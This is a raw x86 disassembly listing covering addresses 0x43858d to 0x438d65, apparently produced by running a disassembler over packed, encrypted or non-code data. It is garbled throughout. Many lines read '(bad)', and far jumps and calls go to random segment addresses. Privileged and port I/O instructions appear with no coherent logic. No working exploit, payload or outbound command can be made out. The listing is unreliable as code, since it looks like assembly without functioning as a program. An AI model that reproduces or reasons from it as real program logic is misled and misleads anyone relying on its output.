  43858d:	jle    0x4385e7
  43858f:	cmp    BYTE PTR cs:[esi+ebp*1+0x56],0x7
  438595:	dec    ecx
  438596:	(bad)  
  438597:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  438598:	and    eax,0x1a873bea
  43859d:	clc    
  43859e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43859f:	cmp    ch,BYTE PTR [ebp-0x6f0f9111]
  4385a5:	inc    esp
  4385a6:	sbb    eax,0x52a809aa
  4385ab:	push   cs
  4385ac:	ss adc esi,0xffffffc8
  4385b0:	sub    DWORD PTR ds:0x80567474,edx
  4385b6:	push   ds
  4385b7:	rcr    DWORD PTR [edx+0x33],0x45
  4385bb:	mov    ebp,0x94162ab0
  4385c0:	mov    dh,0x38
  4385c2:	push   ebx
  4385c3:	adc    bh,BYTE PTR [esi]
  4385c5:	ret    0xd6fa
  4385c8:	mov    al,ds:0x547f26ee
  4385cd:	lods   eax,DWORD PTR ds:[esi]
  4385ce:	inc    ebp
  4385cf:	and    BYTE PTR [esi+0x7e77a292],bl
  4385d5:	mov    BYTE PTR [edi],cl
  4385d7:	jmp    0x6fe6:0x2886015
  4385de:	push   ebp
  4385df:	lock push es
  4385e1:	adc    DWORD PTR [esi+0x568c20],edx
  4385e7:	js     0x4385a9
  4385e9:	(bad)  
  4385ea:	hlt    
  4385eb:	fcom   st(4)
  4385ed:	push   esi
  4385ee:	xchg   esi,eax
  4385ef:	push   0x4
  4385f1:	and    eax,0x8eaadeab
  4385f6:	imul   esp,DWORD PTR [ecx-0x18],0x2a31a225
  4385fd:	or     al,0x8a
  4385ff:	pop    es
  438600:	adc    al,0x16
  438602:	(bad)  
  438603:	push   edi
  438604:	dec    esi
  438605:	fsubrp st(2),st
  438607:	popa   
  438608:	sbb    al,0xc6
  43860a:	pop    ss
  43860b:	test   BYTE PTR [ebp+0x8],bl
  43860e:	sbb    al,BYTE PTR ds:0x2404b682
  438614:	call   0xc0fe:0x9a52a401
  43861b:	or     ch,BYTE PTR [ebx+0x3b]
  43861e:	jmp    0x94e8:0x3488aaeb
  438625:	adc    DWORD PTR [eax+0xbe1b1a4],esp
  43862b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43862c:	sbb    eax,0x2d39494a
  438631:	mov    ds:0x5744f8ed,eax
  438636:	push   ds
  438637:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  438638:	loopne 0x43863e
  43863a:	rcl    dh,1
  43863c:	ror    BYTE PTR [edx+eiz*2-0x58],1
  438640:	pop    esi
  438641:	mov    ch,0x5c
  438643:	mov    ds:0x4d6a4940,eax
  438648:	aad    0x48
  43864a:	jo     0x438630
  43864c:	jne    0x4385d6
  43864e:	(bad)  
  43864f:	int    0x12
  438651:	sbb    cl,BYTE PTR [ecx+0x1c]
  438654:	(bad)  
  438655:	pop    ss
  438656:	and    BYTE PTR [edi+0x15],bl
  438659:	xchg   edx,eax
  43865a:	sbb    al,0xfa
  43865c:	int3   
  43865d:	imul   esp,DWORD PTR [edx+0x7ec01a04],0x41
  438664:	push   0x10
  438666:	(bad)  
  438667:	xchg   esi,eax
  438668:	das    
  438669:	scas   al,BYTE PTR es:[edi]
  43866a:	hlt    
  43866b:	lea    eax,ds:0x6cf0aa0e
  438671:	bound  eax,QWORD PTR [edx+0x64]
  438674:	pop    es
  438675:	push   edi
  438676:	mov    dl,0xbe
  438678:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  438679:	mov    al,ds:0xe849051c
  43867e:	dec    eax
  43867f:	fs jmp 0xb92c07b6
  438685:	sub    ah,0x55
  438688:	cmp    al,0x0
  43868a:	clc    
  43868b:	sbb    cl,BYTE PTR [edx-0x2f54f750]
  438691:	lahf   
  438692:	lods   eax,DWORD PTR ds:[esi]
  438693:	inc    eax
  438694:	or     al,0xa8
  438696:	cli    
  438697:	(bad)  
  438698:	repnz mov dl,BYTE PTR [ebx]
  43869b:	mov    eax,0xb1d14d2c
  4386a0:	sbb    DWORD PTR [eax+edi*2-0xe],0x440afef8
  4386a8:	push   0x35
  4386aa:	or     dl,dl
  4386ac:	xor    BYTE PTR [esp+ecx*4],ch
  4386af:	push   esi
  4386b0:	rcl    ebp,1
  4386b2:	adc    dh,BYTE PTR [ebp+eiz*8+0x0]
  4386b6:	fnstcw WORD PTR [esi]
  4386b8:	jle    0x43867e
  4386ba:	inc    edi
  4386bb:	push   eax
  4386bc:	inc    ebp
  4386bd:	sub    al,bl
  4386bf:	xchg   esi,eax
  4386c0:	mov    esi,0xf6898cf3
  4386c5:	ret    0x3580
  4386c8:	pop    ebx
  4386c9:	inc    eax
  4386ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4386cb:	xchg   esi,eax
  4386cc:	pop    ebp
  4386cd:	push   edx
  4386ce:	fsubr  DWORD PTR [ecx+0x78]
  4386d1:	gs and al,dl
  4386d4:	push   ss
  4386d5:	mov    ch,0x80
  4386d7:	mov    dh,0xa6
  4386d9:	ror    BYTE PTR [edx+0x22],1
  4386dc:	inc    eax
  4386dd:	jbe    0x43874f
  4386df:	(bad)  
  4386e0:	mov    eax,ds:0xfe12a8d8
  4386e5:	xor    edx,DWORD PTR [eax-0x49]
  4386e8:	sbb    BYTE PTR [edx],ch
  4386ea:	stos   BYTE PTR es:[edi],al
  4386eb:	(bad)  
  4386ed:	aad    0x38
  4386ef:	jle    0x4386c8
  4386f1:	pop    esp
  4386f2:	push   0x3d541410
  4386f7:	push   edx
  4386f8:	xchg   esp,eax
  4386f9:	js     0x43874a
  4386fb:	ins    BYTE PTR es:[edi],dx
  4386fc:	out    dx,al
  4386fd:	mov    edx,0x65a1e925
  438702:	jbe    0x438742
  438704:	div    BYTE PTR [esi+0x31]
  438707:	les    esp,FWORD PTR [esi]
  438709:	jnp    0x438717
  43870b:	lods   eax,DWORD PTR ds:[esi]
  43870c:	push   esp
  43870d:	push   edx
  43870e:	hlt    
  43870f:	and    BYTE PTR [edi+0x2d003f14],ah
  438715:	and    al,0x3c
  438717:	stos   BYTE PTR es:[edi],al
  438718:	fwait
  438719:	push   eax
  43871a:	push   ebx
  43871b:	or     DWORD PTR [ecx+eiz*1-0x6fd79be0],eax
  438722:	xchg   ecx,eax
  438723:	hlt    
  438724:	retf   0x7268
  438727:	and    eax,0xfe40eb0e
  43872c:	push   esp
  43872d:	mov    al,0x6c
  43872f:	shl    DWORD PTR [esi-0x2f328a44],1
  438735:	adc    BYTE PTR [edi+0x5c97228c],0xb6
  43873c:	mov    ebp,0xd1f4107c
  438741:	push   eax
  438742:	xor    BYTE PTR [eax-0x65f50e22],al
  438748:	mov    BYTE PTR [eax+0x2e6282aa],bh
  43874e:	iret   
  43874f:	sub    bl,ah
  438751:	test   BYTE PTR [esi],bh
  438753:	sbb    al,bl
  438755:	jbe    0x4387c1
  438757:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  438758:	adc    al,0xd1
  43875a:	push   ds
  43875b:	mov    ds:0x86974dad,eax
  438760:	pop    ss
  438761:	adc    BYTE PTR [edx],al
  438763:	loope  0x4387bb
  438765:	cmp    al,BYTE PTR [ebp+ebx*8-0x2e]
  438769:	aad    0x6
  43876b:	push   edi
  43876c:	push   eax
  43876d:	or     al,0xe7
  43876f:	and    bl,bl
  438771:	cmp    cl,BYTE PTR [edx-0x5811a1a]
  438777:	mov    eax,0x9b2d6ec
  43877c:	imul   ecx,DWORD PTR [esi+edx*8+0x17705ace],0x1409b22
  438787:	push   ebp
  438788:	lock cmp cl,BYTE PTR [esi+ecx*8-0x1dd193b7]
  438790:	xor    al,0x50
  438792:	jp     0x438788
  438794:	pop    esi
  438795:	push   0xffffffe5
  438797:	stos   BYTE PTR es:[edi],al
  438798:	xor    al,0xae
  43879a:	test   BYTE PTR [edx-0x2a],0x2e
  43879e:	aam    0x7d
  4387a0:	mov    ebp,DWORD PTR [edx+0x0]
  4387a3:	dec    edx
  4387a4:	mov    eax,ds:0x46929844
  4387a9:	xchg   BYTE PTR [esi-0x44],dh
  4387ac:	cmp    eax,eax
  4387ae:	xor    al,0x96
  4387b0:	mov    esi,0x9f44458d
  4387b5:	add    dl,BYTE PTR [esi-0x73]
  4387b8:	mov    al,ds:0xbc9d41e1
  4387bd:	push   eax
  4387be:	dec    edx
  4387bf:	push   ecx
  4387c0:	dec    edx
  4387c1:	ret    0x180e
  4387c4:	bound  esp,QWORD PTR [edx+0x5a8a993c]
  4387ca:	and    eax,0x91ac23e3
  4387cf:	push   cs
  4387d0:	sub    ebp,DWORD PTR [ebx+0x7530e8e0]
  4387d6:	(bad)  
  4387d7:	and    edi,DWORD PTR [eax+0x4f]
  4387da:	pushf  
  4387db:	inc    ebp
  4387dc:	mov    ds:0x763c5a4e,al
  4387e1:	loope  0x4387f3
  4387e3:	push   ss
  4387e4:	repnz adc ecx,DWORD PTR [ebp+0x61a8016a]
  4387eb:	or     ah,0x94
  4387ee:	mov    ch,ah
  4387f0:	jo     0x438830
  4387f2:	mov    eax,0x86b2a180
  4387f7:	lock dec ecx
  4387f9:	fisub  DWORD PTR [esi-0x4335ded7]
  4387ff:	icebp  
  438800:	inc    esp
  438801:	ins    DWORD PTR es:[edi],dx
  438802:	push   0x4c64c8fa
  438807:	xor    dl,dh
  438809:	fdivr  DWORD PTR ds:0x9e1ad82a
  43880f:	mov    bh,dl
  438811:	push   0x6d9b4018
  438816:	lock aas 
  438818:	shr    dl,cl
  43881a:	xor    BYTE PTR [edi+0xa],ch
  43881d:	and    al,BYTE PTR [eax]
  43881f:	pop    edx
  438820:	sti    
  438821:	js     0x4387a4
  438823:	push   0xffffff83
  438825:	add    eax,DWORD PTR [eax+0x229218f6]
  43882b:	inc    esi
  43882c:	lods   eax,DWORD PTR ds:[esi]
  43882d:	inc    ebp
  43882e:	xor    al,0x7c
  438830:	mov    ss,WORD PTR [edi]
  438832:	enter  0xef97,0xde
  438836:	and    DWORD PTR [esi+eax*2-0x5bb2def],esi
  43883d:	arpl   cx,si
  43883f:	mov    DWORD PTR [eax+0x3f],ebp
  438842:	push   esp
  438843:	and    al,0x6f
  438845:	push   0x4d
  438847:	jl     0x4388b2
  438849:	mov    ds:0x84781895,al
  43884e:	mov    bh,BYTE PTR [edx-0x3e]
  438851:	(bad)  
  438852:	sbb    ebx,DWORD PTR [ebx+0x10a04411]
  438858:	loop   0x438821
  43885a:	call   0x921c:0x43c15011
  438861:	aad    0x24
  438863:	loop   0x438888
  438865:	mov    cl,0x4b
  438867:	shl    BYTE PTR [edx+edi*8+0x53d265f4],0x5d
  43886f:	inc    esi
  438870:	rcl    DWORD PTR [ecx+0x513a93be],cl
  438876:	ins    BYTE PTR es:[edi],dx
  438877:	inc    edi
  438878:	ret    0xf003
  43887b:	cmp    eax,DWORD PTR [edi]
  43887d:	js     0x43887c
  43887f:	pop    esi
  438880:	add    eax,0x6da005a0
  438885:	int    0xa6
  438887:	into   
  438888:	dec    esp
  438889:	outs   dx,DWORD PTR ds:[esi]
  43888a:	adc    al,0x40
  43888c:	jns    0x4388e0
  43888e:	pop    eax
  43888f:	sbb    bh,BYTE PTR [edi]
  438891:	mov    BYTE PTR [ecx+0x40],cl
  438894:	mov    esi,0x54601a3a
  438899:	je     0x438860
  43889b:	or     cl,dl
  43889d:	sar    BYTE PTR [ecx],0xa3
  4388a0:	sbb    eax,0xab3617eb
  4388a5:	mov    ?,esp
  4388a7:	xchg   ebp,eax
  4388a8:	mov    dl,0xf1
  4388aa:	mov    dh,0x56
  4388ac:	pop    esp
  4388ad:	dec    ebp
  4388ae:	je     0x438869
  4388b0:	add    bl,dh
  4388b2:	cmp    bh,bl
  4388b4:	inc    ebp
  4388b5:	sub    DWORD PTR [ebp-0x30d20b3],0x4
  4388bc:	push   ss
  4388bd:	lahf   
  4388be:	les    edx,FWORD PTR [esi+0x67e0487a]
  4388c4:	scas   al,BYTE PTR es:[edi]
  4388c5:	enter  0xfe6a,0x74
  4388c9:	push   edx
  4388ca:	cmp    DWORD PTR [esp],eax
  4388cd:	outs   dx,BYTE PTR ds:[esi]
  4388ce:	dec    esp
  4388cf:	jle    0x438887
  4388d1:	inc    ebx
  4388d2:	test   eax,0x767b34db
  4388d7:	sub    al,0xd0
  4388d9:	jbe    0x4388c4
  4388db:	(bad)  
  4388dc:	sub    eax,0x2898a63c
  4388e1:	xor    dl,BYTE PTR [eax-0x2]
  4388e4:	loop   0x4388ec
  4388e6:	les    ebp,FWORD PTR [edi]
  4388e8:	adc    DWORD PTR [esp+ebp*1],edx
  4388eb:	push   0xaac21554
  4388f0:	xchg   BYTE PTR [ebp*8+0x2ed3d6c],dl
  4388f7:	(bad)  
  4388f8:	arpl   WORD PTR [edx-0x6263956e],di
  4388fe:	mov    BYTE PTR [ebx+0x6c],al
  438901:	imul   ecx,DWORD PTR [edx],0x18
  438904:	call   0x52f4:0x81be6528
  43890b:	inc    edi
  43890c:	pop    edx
  43890d:	int    0xa4
  43890f:	jmp    0xc083:0xf4b2a22e
  438916:	add    al,0x86
  438918:	out    dx,al
  438919:	inc    edi
  43891a:	mov    ds:0x3aa88a33,eax
  43891f:	cld    
  438920:	adc    esp,esp
  438922:	call   0x6104:0xf6c67c84
  438929:	pusha  
  43892a:	test   eax,0x6704acf0
  43892f:	pop    ebx
  438930:	push   edx
  438931:	inc    eax
  438932:	in     eax,dx
  438933:	or     esi,edx
  438935:	fstp   TBYTE PTR [edx]
  438937:	in     eax,dx
  438938:	enter  0x498f,0x2d
  43893c:	call   0xc268027f
  438941:	sub    eax,esp
  438943:	push   esp
  438944:	pop    es
  438945:	add    dh,dh
  438947:	or     ebp,DWORD PTR [edx+0x2e]
  43894a:	and    ebx,esi
  43894c:	mov    eax,ds:0x95c52e34
  438951:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  438952:	data16 xchg BYTE PTR [ecx],ah
  438955:	jbe    0x43897a
  438957:	xchg   esp,eax
  438958:	imul   eax,DWORD PTR [ecx],0x45
  43895b:	inc    esi
  43895c:	xor    al,0x52
  43895e:	adc    BYTE PTR [esi-0x7d494ba9],dl
  438964:	mov    ebp,0x28343a54
  438969:	scas   al,BYTE PTR es:[edi]
  43896a:	data16 es or bl,BYTE PTR ds:[edi]
  43896f:	lea    ebx,[ebx+0x5e8a696e]
  438975:	das    
  438976:	inc    ebp
  438977:	push   0x98360fb3
  43897c:	cdq    
  43897d:	fsubrp st(2),st
  43897f:	hlt    
  438980:	cmc    
  438981:	int    0xda
  438983:	pop    bx
  438985:	or     ebx,DWORD PTR [eax-0x5468466]
  43898b:	or     DWORD PTR [eiz*4-0xbb94b61],ebp
  438992:	dec    edx
  438993:	and    BYTE PTR [esi+esi*1+0x73d2213a],cl
  43899a:	push   ds
  43899b:	or     eax,0xbed801ea
  4389a0:	push   edi
  4389a1:	mov    al,ds:0xa803b52
  4389a6:	add    edx,0xffffff90
  4389a9:	cs (bad) 
  4389ab:	retf   0x80c6
  4389ae:	call   0x476a:0xdbccb5da
  4389b5:	push   0xffffff96
  4389b7:	mov    ch,0x27
  4389b9:	or     ecx,DWORD PTR [ebp+0x2f9c2aa4]
  4389bf:	call   0xe68:0x4b22889b
  4389c6:	jmp    0xb823:0xdb1b1eb8
  4389cd:	adc    dh,BYTE PTR [edi+eax*1]
  4389d0:	or     esi,edx
  4389d2:	xor    esi,DWORD PTR [esi]
  4389d4:	inc    ebx
  4389d5:	sub    edi,DWORD PTR [ebp+0x2]
  4389d8:	int3   
  4389d9:	push   edx
  4389da:	or     esp,DWORD PTR [esi+0x3a]
  4389dd:	mov    ds:0x6b96a2b0,al
  4389e2:	adc    ah,dl
  4389e4:	cld    
  4389e5:	je     0x438991
  4389e7:	sub    al,ch
  4389e9:	xor    al,bl
  4389eb:	sbb    al,0x1e
  4389ed:	sub    cl,BYTE PTR [esi+0x8]
  4389f0:	js     0x4389fe
  4389f2:	je     0x438a4c
  4389f4:	sub    al,0xb6
  4389f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4389f7:	xchg   edx,eax
  4389f8:	mov    ch,0x40
  4389fa:	xor    al,0x5c
  4389fc:	rol    DWORD PTR [esp+eiz*8],1
  4389ff:	dec    edx
  438a00:	push   ecx
  438a01:	xchg   esp,eax
  438a02:	std    
  438a03:	xchg   esi,eax
  438a04:	aam    0x80
  438a06:	aaa    
  438a07:	test   al,0xea
  438a09:	xor    eax,0xa8929058
  438a0e:	push   eax
  438a0f:	cmp    al,0x11
  438a11:	bound  ebp,QWORD PTR [ecx-0x45567fef]
  438a17:	cmp    al,0x70
  438a19:	ins    BYTE PTR es:[edi],dx
  438a1a:	or     DWORD PTR [edx],ebp
  438a1c:	pop    esp
  438a1d:	ret    0x2c23
  438a20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  438a21:	sti    
  438a22:	mov    ah,0x82
  438a24:	scas   eax,DWORD PTR es:[edi]
  438a25:	sar    BYTE PTR [esi],1
  438a27:	shr    DWORD PTR [edx+0x73],cl
  438a2a:	stos   BYTE PTR es:[edi],al
  438a2b:	daa    
  438a2c:	stos   BYTE PTR es:[edi],al
  438a2d:	hlt    
  438a2e:	push   ebx
  438a2f:	pop    edx
  438a30:	inc    ebp
  438a31:	mov    DWORD PTR [edi+0x1724a01c],0xe167dc4
  438a3b:	mov    ah,0xdc
  438a3d:	adc    al,0x1a
  438a3f:	push   eax
  438a40:	mov    cs,esp
  438a42:	(bad)  
  438a43:	sbb    DWORD PTR [esi+0x6b],eax
  438a46:	loop   0x438aa7
  438a48:	push   edx
  438a49:	fild   DWORD PTR [ecx-0x66541de9]
  438a4f:	push   edx
  438a50:	adc    ebp,eax
  438a52:	mov    dl,0x75
  438a54:	stc    
  438a55:	scas   al,BYTE PTR es:[edi]
  438a56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  438a57:	daa    
  438a58:	enter  0x22e5,0xf5
  438a5c:	out    0xe2,al
  438a5e:	adc    eax,DWORD PTR [eax]
  438a60:	popa   
  438a61:	outs   dx,DWORD PTR ds:[esi]
  438a62:	int    0x34
  438a64:	ins    BYTE PTR es:[edi],dx
  438a65:	cmp    DWORD PTR [edx+eiz*4],0xc5cc522b
  438a6c:	and    al,0x15
  438a6e:	pop    esp
  438a6f:	pop    ecx
  438a70:	mov    cl,bh
  438a72:	push   ds
  438a73:	test   BYTE PTR [edx+0x24],cl
  438a76:	dec    edx
  438a77:	push   ebp
  438a78:	loopne 0x438a0e
  438a7a:	(bad)  
  438a7b:	xor    al,0x90
  438a7d:	mov    al,0xc0
  438a7f:	sub    DWORD PTR [esi-0x3f5465b2],edx
  438a85:	xchg   BYTE PTR [edi],ah
  438a87:	jge    0x438ad7
  438a89:	loopne 0x438ad7
  438a8b:	jbe    0x438a7e
  438a8d:	repnz leave 
  438a8f:	jmp    0x8123f45e
  438a94:	xor    al,0x8e
  438a96:	inc    eax
  438a97:	sub    DWORD PTR [ebp+0xc622c40],0x353be2d
  438aa1:	adc    al,0x9c
  438aa3:	xor    BYTE PTR [esi+0x1dc5b60],ch
  438aa9:	pusha  
  438aaa:	xlat   BYTE PTR ds:[ebx]
  438aab:	push   ebp
  438aac:	push   es
  438aad:	mov    edx,0x4580c800
  438ab2:	push   edi
  438ab3:	or     BYTE PTR [eax+0x1d],ch
  438ab6:	pop    ds
  438ab7:	pop    esi
  438ab8:	shl    BYTE PTR [ebx+0x5eac5118],0xea
  438abf:	pop    eax
  438ac0:	mov    esi,0x6676d0ea
  438ac5:	add    al,0xbd
  438ac7:	add    BYTE PTR [esi-0x4d],ah
  438aca:	scas   al,BYTE PTR es:[edi]
  438acb:	xor    al,0x81
  438acd:	add    al,BYTE PTR [edx-0x69998378]
  438ad3:	add    esp,DWORD PTR [ebx+0x53]
  438ad6:	inc    edi
  438ad7:	xchg   BYTE PTR [edx],dl
  438ad9:	and    BYTE PTR [edx+0x6b],ch
  438adc:	imul   DWORD PTR [edi*8-0x384a4fcc]
  438ae3:	fmul   QWORD PTR [ebx]
  438ae5:	sbb    al,0x83
  438ae7:	jle    0x438ab3
  438ae9:	adc    BYTE PTR [ebp-0x5f],0x25
  438aed:	sti    
  438aee:	add    eax,0x221e3154
  438af3:	sbb    dl,BYTE PTR [esi+0x33581416]
  438af9:	mov    eax,0xd2065190
  438afe:	loope  0x438b6c
  438b00:	test   eax,0x1ea83852
  438b05:	js     0x438b66
  438b07:	test   al,0x86
  438b09:	shl    ch,1
  438b0b:	scas   al,BYTE PTR es:[edi]
  438b0c:	leave  
  438b0d:	or     BYTE PTR [edi-0x64],ch
  438b10:	xor    al,0xcd
  438b12:	dec    eax
  438b13:	jge    0x438aaf
  438b15:	enter  0xb6e8,0x10
  438b19:	sahf   
  438b1a:	add    al,0x51
  438b1c:	icebp  
  438b1d:	test   DWORD PTR [eax+ebx*8-0x2d10cbf9],ebx
  438b24:	leave  
  438b25:	sub    al,ch
  438b27:	xchg   bl,dl
  438b29:	nop
  438b2a:	(bad)  
  438b2b:	ins    BYTE PTR es:[edi],dx
  438b2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  438b2d:	lock mov dh,0x5a
  438b30:	out    dx,al
  438b31:	xlat   BYTE PTR ds:[ebx]
  438b32:	adc    ebx,DWORD PTR [eax+ecx*1]
  438b35:	add    BYTE PTR [edx],dh
  438b37:	sub    eax,0x2b105ec0
  438b3c:	or     BYTE PTR [ebx+edi*1],0xf4
  438b40:	push   0xfffffff7
  438b42:	xor    eax,0x12e165
  438b47:	dec    eax
  438b48:	xor    esi,DWORD PTR [edx-0x31aabf53]
  438b4e:	nop
  438b4f:	sub    dl,BYTE PTR [edx]
  438b51:	mov    ebp,eax
  438b53:	fadd   QWORD PTR [esi+0x40]
  438b56:	add    bl,BYTE PTR [ebx+0x4d869569]
  438b5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  438b5d:	push   ebx
  438b5e:	mov    esi,0x542f56a
  438b63:	pop    bp
  438b65:	jl     0x438bc5
  438b67:	out    0x72,al
  438b69:	mov    WORD PTR [esi+eiz*1+0x4c826a18],gs
  438b70:	fild   QWORD PTR [eax-0x59]
  438b73:	test   eax,0x73acbcb5
  438b78:	push   cs
  438b79:	or     al,0x38
  438b7b:	jo     0x438bbe
  438b7d:	out    dx,al
  438b7e:	cwde   
  438b7f:	xor    BYTE PTR [eax],0x3d
  438b82:	ss or  al,dh
  438b85:	sub    cl,BYTE PTR [eax]
  438b87:	mov    WORD PTR [ebx-0x4e],es
  438b8a:	pop    edx
  438b8b:	fwait
  438b8c:	sub    DWORD PTR [edx],0x3c
  438b8f:	mov    cl,0x8
  438b91:	cli    
  438b92:	test   eax,0x63b68ba
  438b97:	jle    0x438b3d
  438b99:	inc    ebx
  438b9a:	lock push 0x243de87f
  438ba0:	pop    bx
  438ba2:	daa    
  438ba3:	stos   BYTE PTR es:[edi],al
  438ba4:	xchg   BYTE PTR [ebp+0x344d64ba],ch
  438baa:	ror    DWORD PTR [esi-0x6cfe03c4],cl
  438bb0:	mov    eax,0x6b6b7458
  438bb5:	data16 test al,0xbc
  438bb8:	jb     0x438bca
  438bba:	out    0xa,eax
  438bbc:	push   ebp
  438bbd:	add    ah,BYTE PTR [ecx]
  438bbf:	test   DWORD PTR [edx-0x65e065b9],ecx
  438bc5:	hlt    
  438bc6:	loop   0x438c0f
  438bc8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  438bc9:	pop    edx
  438bca:	push   ecx
  438bcb:	sahf   
  438bcc:	adc    al,0x95
  438bce:	push   ss
  438bcf:	or     dl,dl
  438bd1:	mov    ch,0x55
  438bd3:	or     eax,0xe64a1202
  438bd8:	lock xchg esi,eax
  438bda:	icebp  
  438bdb:	xchg   edx,eax
  438bdc:	mov    ch,0xb5
  438bde:	out    0xec,al
  438be0:	add    BYTE PTR [ebx+0x4c8f8276],bh
  438be6:	and    DWORD PTR [ecx-0x3f],ebx
  438be9:	jbe    0x438c57
  438beb:	cld    
  438bec:	test   al,0xd2
  438bee:	mov    ah,BYTE PTR [esi]
  438bf0:	add    eax,0xeabbd494
  438bf5:	test   al,0xc0
  438bf8:	and    dh,dl
  438bfa:	out    0x3d,al
  438bfc:	dec    eax
  438bfd:	xchg   edx,eax
  438bfe:	popf   
  438bff:	jbe    0x438c5f
  438c01:	int    0x28
  438c03:	mov    al,0xfc
  438c05:	push   0x30
  438c07:	div    BYTE PTR fs:[edx+0x1b]
  438c0b:	mov    dh,0xe2
  438c0d:	dec    eax
  438c0e:	shr    BYTE PTR ds:0x6a2a687e,cl
  438c14:	aad    0x67
  438c16:	sbb    al,0xb0
  438c18:	retf   
  438c19:	mov    al,0x0
  438c1b:	xchg   esp,eax
  438c1c:	adc    BYTE PTR [edi-0x505373b0],dh
  438c22:	adc    al,0x5a
  438c24:	jnp    0x438c2a
  438c26:	pusha  
  438c27:	dec    ecx
  438c28:	out    dx,al
  438c29:	pop    ss
  438c2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  438c2b:	ficomp WORD PTR [edx-0x232be527]
  438c31:	outs   dx,BYTE PTR ds:[esi]
  438c32:	mov    ds:0x88ea5ee2,eax
  438c37:	sti    
  438c38:	cmp    eax,0x4d5a742
  438c3d:	out    0xec,al
  438c3f:	xor    eax,0x2b49c84e
  438c44:	sbb    edi,DWORD PTR [edi]
  438c46:	dec    ecx
  438c47:	xor    ch,BYTE PTR [ebx+0x5]
  438c4a:	jmp    0x3422:0x8c8ab5d7
  438c51:	ficom  WORD PTR [eax]
  438c53:	loopne 0x438c87
  438c55:	mov    dh,al
  438c57:	daa    
  438c58:	imul   ebp,DWORD PTR [esi-0x161159f4],0xe1a1b5a4
  438c62:	adc    dl,BYTE PTR [edx]
  438c64:	into   
  438c65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  438c66:	clc    
  438c67:	jge    0x438ccf
  438c69:	(bad)  
  438c6a:	mul    BYTE PTR [esp+edi*2+0x72]
  438c6e:	cld    
  438c6f:	xchg   esi,eax
  438c70:	lock cmp BYTE PTR [esi+ecx*8+0x2d0976c5],dl
  438c78:	mov    eax,0x923ceee8
  438c7d:	std    
  438c7e:	sbb    BYTE PTR [ebp-0x3fe41f90],dl
  438c84:	mov    fs,WORD PTR [ebp+0x42c1ca84]
  438c8a:	sbb    al,0x71
  438c8c:	add    eax,0xceec55a9
  438c91:	push   ss
  438c92:	icebp  
  438c93:	inc    esi
  438c94:	xor    BYTE PTR [ecx+0x50946b06],al
  438c9a:	(bad)  
  438c9b:	cli    
  438c9c:	mov    al,0xc6
  438c9e:	lock push ecx
  438ca0:	push   esp
  438ca1:	add    DWORD PTR [eax-0x7693674f],esp
  438ca7:	cmp    eax,0x6e067c44
  438cac:	adc    eax,0xd6c66c76
  438cb1:	or     ch,BYTE PTR [edx+ebx*8-0x15]
  438cb5:	cli    
  438cb6:	fadd   QWORD PTR [esp+eiz*2]
  438cb9:	sub    BYTE PTR [edx],bl
  438cbb:	add    eax,0x11d8caed
  438cc0:	jbe    0x438caf
  438cc2:	data16 sti 
  438cc4:	pop    edx
  438cc5:	sbb    DWORD PTR [ecx+0x32],0xffffffbc
  438cc9:	cwde   
  438cca:	inc    esp
  438ccb:	inc    esp
  438ccc:	pop    eax
  438ccd:	dec    esp
  438cce:	xchg   esp,eax
  438ccf:	mov    al,0xc4
  438cd1:	adc    al,0xea
  438cd3:	fs add ecx,esi
  438cd6:	sbb    DWORD PTR [ebx],ebx
  438cd8:	(bad)  
  438cd9:	int    0x7d
  438cdb:	jle    0x438ce2
  438cdd:	aad    0x18
  438cdf:	outs   dx,DWORD PTR ds:[esi]
  438ce0:	adc    DWORD PTR [ebx],ecx
  438ce2:	fiadd  DWORD PTR [eax-0x72]
  438ce5:	sub    BYTE PTR [eax-0x53c3ff8f],dl
  438ceb:	jge    0x438d3d
  438ced:	clc    
  438cee:	sub    eax,0xb39f0016
  438cf3:	shl    BYTE PTR [edx+0x7c],cl
  438cf6:	pop    ebx
  438cf7:	mov    BYTE PTR [ecx+0x50],dl
  438cfa:	sbb    DWORD PTR [ecx+0x75481080],0xa300eb2e
  438d04:	les    ebx,FWORD PTR [ecx-0x46d6693e]
  438d0a:	add    al,0xb5
  438d0c:	adc    ah,BYTE PTR [esp+eax*4+0x0]
  438d10:	mov    al,ds:0x600a21ea
  438d15:	int    0x80
  438d17:	(bad)  [edx+edi*4]
  438d1a:	mov    esi,0x23b5a686
  438d1f:	mov    BYTE PTR [ebx+0x28],ch
  438d22:	imul   ecx,DWORD PTR [eax+0x361a41e3],0xfffffff1
  438d29:	mov    eax,eax
  438d2b:	in     al,0x57
  438d2d:	add    bh,BYTE PTR [esi]
  438d2f:	jb     0x438d53
  438d31:	ss out dx,eax
  438d33:	cli    
  438d34:	xchg   esp,eax
  438d35:	add    BYTE PTR [ebx+esi*4+0x2a1200b2],bh
  438d3c:	mov    WORD PTR [ebx+esi*1+0x41],gs
  438d40:	xlat   BYTE PTR ds:[ebx]
  438d41:	inc    esi
  438d42:	out    dx,eax
  438d43:	mov    al,0x10
  438d45:	inc    esp
  438d46:	sbb    eax,0x4782c4
  438d4b:	cmp    esp,DWORD PTR [eax-0x38]
  438d4e:	hlt    
  438d4f:	dec    eax
  438d50:	inc    ecx
  438d51:	mov    ah,0xc4
  438d53:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  438d55:	test   al,0xdc
  438d57:	pop    edx
  438d58:	mov    al,ds:0x455566c2
  438d5d:	jecxz  0x438d72
  438d5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  438d60:	outs   dx,DWORD PTR ds:[esi]
  438d61:	add    al,0xb7
  438d63:	mov    eax,esp
  438d65:	push   cs
